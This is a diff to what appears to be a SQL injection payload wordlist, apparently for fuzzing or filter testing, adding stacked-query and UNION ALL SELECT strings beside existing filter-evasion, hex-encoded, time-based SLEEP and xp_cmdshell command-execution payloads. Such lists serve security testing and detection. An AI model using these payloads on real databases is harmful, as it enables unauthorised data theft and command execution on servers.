@@ -54,6 +54,8 @@ SEL/*foo*/ECT username,password FR/*foo*/OM users
 SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
 exec('select * from users')
 exec('sel' + 'ect * from ' + 'users')
+exec('sel' + 'ect * from ' + '*')
+;exec('sel' + 'ect * from ' + '*');--
 declare l_cnt varchar2(20); begin execute immediate 'sel'||'ect * fr'||'om_users' into l_cnt; dbms_output.put_line(l_cnt); end;
 declare @q varchar(8000); select @q = 0x73656c656374202a2066726f6d207573657273; exec (@q)
 admin;--
@@ -88,10 +90,13 @@ admin' AND ASCII(SUBSTRING('Admin',1,1)) == 66--
 0)%20UNION%20ALL%20SELECT%20*,%202%20from%20user%20where%201%20=%20(1
 0) UNION ALL SELECT * from user where 1 = (1
 0) UNION ALL SELECT *, 2 from user where 1 = (1
+;UNION ALL SELECT * from user where 1 = 1;--
+UNION ALL SELECT * from user where 1 = 1;--
 '+convert(int,convert(varchar,0x7b5d))+'=1
 [4=&5=&3=&8=&7=&1=&6=&2=&quantity=1%20AND%20SLEEP(21)=0]
 '; exec master..xp_cmdshell 'ping 10.124.62.174'--
 SELECT DB_NAME()
+SELECT DB_NAME();
 %53%45%4c%45%43%54%20%44%42%5f%4e%41%4d%45%28%29
 SelEcT Db_NaMe()
 SELECT HOST_NAME()
